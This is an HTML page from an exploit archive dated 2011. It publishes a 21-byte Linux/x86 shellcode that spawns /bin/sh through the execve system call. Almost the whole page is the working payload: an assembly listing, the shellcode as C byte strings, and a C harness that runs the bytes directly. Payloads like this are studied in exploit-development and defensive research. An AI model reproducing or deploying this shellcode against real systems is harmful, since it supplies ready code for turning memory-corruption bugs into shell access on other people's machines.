<html><head><title>Linux/x86 - execve (/bin/sh) - 21 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 Title: linux/x86 Shellcode execve (&quot;/bin/sh&quot;) - 21 Bytes
 Date     : 10 Feb 2011
 Author   : kernel_panik
 Thanks   : cOokie, agix, antrhacks
*/

/*
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char code[] = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f&quot;
              &quot;\x73\x68\x68\x2f\x62\x69\x6e\x89&quot;
              &quot;\xe3\xb0\x0b\xcd\x80&quot;;

int main(int argc, char **argv)
{
 printf (&quot;Shellcode length : %d bytes\n&quot;, strlen (code));
 int(*f)()=(int(*)())code;
 f();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
